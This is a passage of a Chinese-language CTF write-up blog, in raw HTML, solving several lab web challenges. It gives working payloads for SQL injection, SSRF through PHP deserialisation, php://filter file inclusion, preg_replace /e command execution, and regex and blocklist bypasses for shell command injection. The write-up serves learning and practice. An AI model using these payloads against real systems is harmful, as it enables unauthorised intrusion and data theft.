class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段可以说明get没有做过滤，可以SSRF</p>
<p>更改一下，做SSRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;</span><br></pre></td></tr></table></figure>
<p>特别注意：++在URL中转译为空格，故也可以这么写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看返回列个数 &#x2F;view.php?no&#x3D;1++order++by++4</span><br></pre></td></tr></table></figure>


<h3 id="sql手工注入"><a href="#sql手工注入" class="headerlink" title="sql手工注入"></a>sql手工注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆列名 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;)),1)#</span><br><span class="line">爆字段 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select data from users)),1)#</span><br></pre></td></tr></table></figure>
<h3 id="fuzz测试"><a href="#fuzz测试" class="headerlink" title="fuzz测试"></a>fuzz测试</h3><p>fuzz测试也叫模糊测试，是一种黑盒测试。通过构造非法字段，观察被测试软件是否异常。</p>
<h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p>kali下的fuzz测试工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆破文件</span><br><span class="line">wfuzz -w wordlist URL&#x2F;FUZZ.php</span><br><span class="line"></span><br><span class="line">爆破目录</span><br><span class="line">wfuzz -w wordlist URL&#x2F;FUZZ</span><br><span class="line"></span><br><span class="line">遍历枚举参数值</span><br><span class="line">wfuzz -z range,000-999 http:&#x2F;&#x2F;127.0.0.1&#x2F;getuser.php?uid&#x3D;FUZZ</span><br></pre></td></tr></table></figure>


<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>考察：远程命令漏洞，Django，cURL</p>
<p>登录，只有一个输入域名的框，输入baidu.com&amp;ls，显示无效ip，因此判断是输入url</p>
<p>尝试输入127.0.0.1。</p>
<p>发现对127.0.0.1进行了ping，说明执行了命令</p>
<p>尝试以下简单命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ls</span><br></pre></td></tr></table></figure>
<p>失败，提示URL不合法。</p>
<p>观察URL，发现命令直接在URL处以GET方式提交。考虑URL解析ASCII码只到%3F，因此提交%FF</p>
<p>返回一个特别长的HTML代码，保存后用浏览器打开。</p>
<p>得到的信息有：该网页为Django框架；数据库绝对路径为/opt/apt/database.sqlite3</p>
<p>php通常使用cURL库作为客户端和服务端通信，因此输入以下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@&#x2F;opt&#x2F;apt&#x2F;database.sqlite3</span><br><span class="line"># 根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息</span><br></pre></td></tr></table></figure>
<p>又返回一长串html，用网页打开后搜索ctf，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHCTF&#123;yoooo_Such_A_G00D_@&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>Django目录下一般有一个settings.py用于设置网站数据库路径（默认使用sqlites)</p>
<p>所以也可以读取settings.py</p>
<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>考察：文件包含漏洞；PHP下远程调用命令行</p>
<p>首先进入网页，发现只有“设备维护中心可以进入”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p>进入后，再点击左上角的云平台设备维护中心，URL变成如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php?page&#x3D;index</span><br></pre></td></tr></table></figure>
<p>此处为明显的文件注入漏洞，通过php://伪协议下载index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>下载出来后是base64编码，还原后得到index.php，关键函数为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解读：如果HTTP_X_FOWARDED_FOR为127.0.0.1，则执行preg_replace。</p>
<p>首先在报文Header处添加X_Forwarded_For:127.0.0.1，得以看到“Welcome My Admin ! ”</p>
<p>然后根据preg_replace的/e漏洞，修改报文后发送，可以得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;ls&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1  </span><br><span class="line">&#x2F;*index.html</span><br><span class="line">index.php</span><br><span class="line">js</span><br><span class="line">layui</span><br><span class="line">logo.png</span><br><span class="line">s3chahahaDir</span><br><span class="line">start.sh</span><br><span class="line">视图.png</span><br><span class="line">*&#x2F;</span><br><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;find+-iname+flag&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1 # # +在PHP的URL解析中代表空格</span><br><span class="line">&#x2F;*.&#x2F;s3chahahaDir&#x2F;flag*&#x2F;</span><br><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;cd+.&#x2F;s3chahahaDir&#x2F;flag%26%26+cat+flag.php&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1 # %26在PHP的URL解析中代表&amp;，而在命令行中，&amp;&amp;代表前面的语句执行成功后，执行后面的语句</span><br><span class="line">&#x2F;*得到flag*&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;d46915710af3a6e405b68271d55edd82&#125;</span><br></pre></td></tr></table></figure>
<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php # 可以以base64方式读取文件</span><br></pre></td></tr></table></figure>
<h3 id="PHP中preg-replace的-e漏洞"><a href="#PHP中preg-replace的-e漏洞" class="headerlink" title="PHP中preg_replace的/e漏洞"></a>PHP中preg_replace的/e漏洞</h3><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向 引用替换完之后）。 提示：要确保 replacement 构成一个合法的 PHP 代码字符串， 否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是说只要在subject中有要搜索的pattern的内容，同时将在replacement前加上&#x2F;e，触发&#x2F;e漏洞，就可以执行replacement中的正确的php代码</span><br></pre></td></tr></table></figure>
<h2 id="favourite-number"><a href="#favourite-number" class="headerlink" title="favourite_number"></a>favourite_number</h2><p>考察：php的两个漏洞利用，tac</p>
<p>进入页面就是一段php代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;php5.5.9</span><br><span class="line">$stuff &#x3D; $_POST[&quot;stuff&quot;];</span><br><span class="line">$array &#x3D; [&#39;admin&#39;, &#39;user&#39;];</span><br><span class="line">if($stuff &#x3D;&#x3D;&#x3D; $array &amp;&amp; $stuff[0] !&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">    $num&#x3D; $_POST[&quot;num&quot;];</span><br><span class="line">    if (preg_match(&quot;&#x2F;^\d+$&#x2F;im&quot;,$num))&#123;</span><br><span class="line">        if (!preg_match(&quot;&#x2F;sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#39;|\&quot;|\|&#x2F;i&quot;,$num))&#123;</span><br><span class="line">            echo &quot;my favorite num is:&quot;;</span><br><span class="line">            system(&quot;echo &quot;.$num);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;Bonjour!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即首先要提交一个stuff，绕过stuff的检测，再提交一个num，num绕过preg_match的检测并执行命令</p>
<p>stuff绕过利用了php5.5.26的这个漏洞<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=69892">https://bugs.php.net/bug.php?id=69892</a></p>
<p>提交URL的post data为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1</span><br></pre></td></tr></table></figure>
<p>输出了1，接下来要绕过num的检测。接下来要绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&quot;&#x2F;^\d+$&#x2F;im&quot;,$num)</span><br></pre></td></tr></table></figure>
<p>需要用%0a进行跨行匹配，故payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0als</span><br></pre></td></tr></table></figure>
<p>可以看到在根目录下有flag</p>
<p>由于cat有绕过，因此使用其他的查看文件方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法1：tcat+inode</span><br><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0atac ls -i ## 查看flag文件的inode号</span><br><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0atac &#96;find &#x2F; -inum 38274922&#96; ## 反引号用于绕过单双引号过滤</span><br><span class="line">方法2：将文件名输入到文件，然后执行文件</span><br><span class="line">printf &#x2F;fla &gt; &#x2F;tmp&#x2F;hello &amp;&amp; printf g &gt;&gt; &#x2F;tmp&#x2F;hello &amp;&amp; tac &#96;tac &#x2F;tmp&#x2F;hello&#96;</span><br><span class="line">cyberpeace&#123;c4a2094df61c50b15a72dc9b97bc7716&#125; </span><br></pre></td></tr></table></figure>
<h3 id="php5-5-9的溢出漏洞"><a href="#php5-5-9的溢出漏洞" class="headerlink" title="php5.5.9的溢出漏洞"></a>php5.5.9的溢出漏洞</h3><p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=69892">https://bugs.php.net/bug.php?id=69892</a></p>
<p>4294967296=2^32</p>
<h3 id="php下preg-match的绕过方法"><a href="#php下preg-match的绕过方法" class="headerlink" title="php下preg_match的绕过方法"></a>php下preg_match的绕过方法</h3><p>数组绕过：传入的对象是数组时，返回false</p>
<p>换行符绕过：.不匹配换行符，$会忽略句尾的%0a</p>
<h3 id="Linux下查看文件内容的方法"><a href="#Linux下查看文件内容的方法" class="headerlink" title="Linux下查看文件内容的方法"></a>Linux下查看文件内容的方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat、tac、more、less、head、tail、nl</span><br></pre></td></tr></table></figure>
<p>当文件名也被注释时，使用inode可以索引文件</p>
<p>首先用ls -i查找flag编号</p>
<p>或者可以使用文件名输入到文件，然后执行文件的方法</p>
<h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p>考察：代码审计</p>
<p>跳过了用githack下载的步骤，题目直接给出了源文件</p>
<p>审计文件，发现在api.php中出现了flag字样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag_price</span>;</span><br><span class="line"></span><br><span class="line">	require_registered();</span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="variable">$flag_price</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;you don\&#x27; have enough money&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$money</span> -= <span class="variable">$flag_price</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">		<span class="variable">$msg</span> = <span class="string">&#x27;Here is your flag: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">		response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="variable">$msg</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而$money是一个session中的值，<strong>无法修改</strong></p>
<p>又找到了负责跳转的部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="variable">$data</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;buy&#x27;</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;numbers&#x27;</span>]);</span><br><span class="line">		buy(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">		flag(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;register&#x27;</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		register(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		response_error(<span class="string">&#x27;invalid request&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用burp抓包后，包类似于如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api.php HTTP&#x2F;1.1</span><br><span class="line">Host: 220.249.52.134:51525</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;220.249.52.134:51525&#x2F;buy.php</span><br><span class="line">Content-Length: 64</span><br><span class="line">Cookie: PHPSESSID&#x3D;teiedeaf2vra9rrn9ipttquv36</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;action&quot;:&quot;flag&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
<p>同时，在buy下，有这么一个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = random_win_nums();</span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑为“用钱买彩票”</p>
<p>而判断是否中奖，用的是php中的宽等于，因此可以使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
<p>不断中奖，在中奖是$money的值也会提高</p>
<p>在$money超过$flag_money后，可以修改action为flag，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;9491ec43e58eb3d07479508a0c48781e&#125;</span><br></pre></td></tr></table></figure>
<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2><p>考察：代码审计，sqlite注入，爬虫、python的pdfminer库</p>
<p>首先进入页面，大概就是在不同的目录下载论文的功能。</p>
<p>使用御剑进行扫描，存在admin.php和login.php，分别登陆</p>
<p>尝试用sqlmap进行注入，时间过长 ，放弃</p>
<p>查看网页源代码，在login.php中存在以下注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</span><br></pre></td></tr></table></figure>
<p>尝试访问url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;220.249.52.134:40279&#x2F;login.php?debug</span><br></pre></td></tr></table></figure>
<p>获得源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 